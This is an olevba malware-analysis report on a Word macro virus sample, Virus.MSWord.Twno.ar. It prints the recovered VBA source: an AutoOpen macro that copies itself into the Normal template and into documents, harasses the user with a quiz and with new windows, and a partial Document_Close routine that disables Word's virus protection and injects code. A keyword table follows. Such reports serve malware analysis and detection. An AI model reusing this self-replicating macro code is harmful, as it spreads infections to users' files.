olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twno.ar
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twno.ar - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Twno.ar - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim nm__()
Public Sub MAIN()
ReDim nm__(4)
Dim test
Dim con
Dim tog$
Dim i
Dim ans$
Dim j
Dim nor
Dim kk
Dim t
Dim file$
Dim filem$
Dim nor1
Dim kkk
Dim tt
WordBasic.DisableInput 1
If WordBasic.Day(WordBasic.Now()) = 97 Then
try:
On Error GoTo -1: On Error GoTo 0
On Error GoTo -1: On Error GoTo try
test = -1
con = 1
tog$ = ""
i = 0

        While test = -1

            For i = 0 To 4
            nm__(i) = WordBasic.Int(Rnd() * 10000)
            con = (con * nm__(i))
            If i = 4 Then
            tog$ = tog$ + Str(nm__(4)) + " =?"
            GoTo beg
            End If
            tog$ = tog$ + Str(nm__(i)) + " *"
            Next i
beg:
            WordBasic.Beep
            ans$ = WordBasic.[InputBox$]("¤µ¤Ñ¬O " + WordBasic.[Date$]() + " ,¸ò§Aª±¤@­Ó¤ßºâ¹CÀ¸" + Chr(13) + _
"­Y§Aµª¿ù,¥u¦n±µ¨ü¾_¾Ù±Ð¨|.............." + Chr(13) + _
tog$, "¥xÆW NO.1 Macro Virus")
        If WordBasic.[RTrim$](WordBasic.[LTrim$](ans$)) = WordBasic.[LTrim$](Str(con)) Then
            WordBasic.MsgBox "®¥¶P§Aµª¹ï¤F,«ö½T©w´N§i¶D§A·Qª¾¹Dªº....", _
                    "¥xÆW NO.1 Macro Virus"
            WordBasic.FileNewDefault
            WordBasic.CenterPara
            WordBasic.FormatFont Font:="²Ó©úÅé", Points:=16, Bold:=1, Underline:=1
            WordBasic.Beep
            WordBasic.Insert "¦ó¿×¥¨¶°¯f¬r¡H"
            WordBasic.InsertPara
            WordBasic.Beep
            WordBasic.Insert "µª®×:"
            WordBasic.Italic 1
            WordBasic.Insert "§Ú´N¬O....."
            WordBasic.InsertPara
            WordBasic.InsertPara
            WordBasic.Italic 0
            WordBasic.FormatFont Font:="²Ó©úÅé", Points:=16, Bold:=1, Underline:=1
            WordBasic.Beep
            WordBasic.Insert "¦p¦ó¹w¨¾¥¨¶°¯f¬r¡H"
            WordBasic.InsertPara
            WordBasic.Beep
            WordBasic.Insert "µª®×:"
            WordBasic.Italic 1
            WordBasic.Insert "¤£­n¬Ý§Ú....."
            GoTo exit_
            Else
            For j = 1 To 20
            WordBasic.Beep
            WordBasic.FileNewDefault
            Next j
            WordBasic.CenterPara
            WordBasic.FormatFont Font:="²Ó©úÅé", Points:=16, Bold:=1, Underline:=1
            WordBasic.Insert "¥¨¶°¯f¬r"
            GoTo try
            End If

        Wend
            End If

nor = WordBasic.CountMacros(0)
If nor > 0 Then
    For kk = 1 To nor
        If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
        t = 1
        End If
        Next kk
        
End If

file$ = WordBasic.[FileName$]()
filem$ = file$ + ":AutoOpen"
If t <> 1 Then
    WordBasic.MacroCopy filem$, "AutoOpen"
    WordBasic.MacroCopy filem$, "AutoNew"
    WordBasic.MacroCopy filem$, "AutoClose"
End If

nor1 = WordBasic.CountMacros(1)
If nor1 > 0 Then
    For kkk = 1 To nor1
        If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
        tt = 1
        End If
        Next kkk
        
End If

If tt <> 1 Then
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "AutoOpen", filem$
End If

    

exit_:
End Sub

-------------------------------------------------------------------------------
VBA MACRO DocumentSummaryInformation 
in file: Virus.MSWord.Twno.ar - OLE stream: '\x05DocumentSummaryInformation'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
' Open Letter to the Virus Hunters
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
' This virus was written to help educate the
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
' millennium bug. Please do not update your
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
' until after December 1, 1999.
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
' I know you won't do that, but what the heck.
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
' I tried.
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
' Bye!
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
On Error Resume Next
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
s = ActiveDocument.Saved
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
Application.EnableCancelKey = Not -1
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
Randomize
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
If Dir("c:\sys00.bak", 6) = "" Then
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
   For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
      Print #1, a
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
   Close #1
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
End If
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'y2k" Then
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'y2k" Then
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
Else
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
End If
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
If tf <> "" Then
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
   If LOF(1) = 0 Then GoTo q
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
   Do While Not EOF(1)
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
      tf.CodeModule.InsertLines i, a
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
   Loop
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
   Close #1
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
   If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit

'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
hh = Hour(Now): mm = Minute(Now): ss = Second(Now)
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
' only display messages for 1999
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
   GoTo end_here
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit

'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
If hh > 12 Then
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
End If
'Ditry PC11/1/99 10:26:35 PMsample1.docClippit
t$ = Chr(13) + Chr(13)

'april 1, 1999
If dd = 1 And mm = 4 Then
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

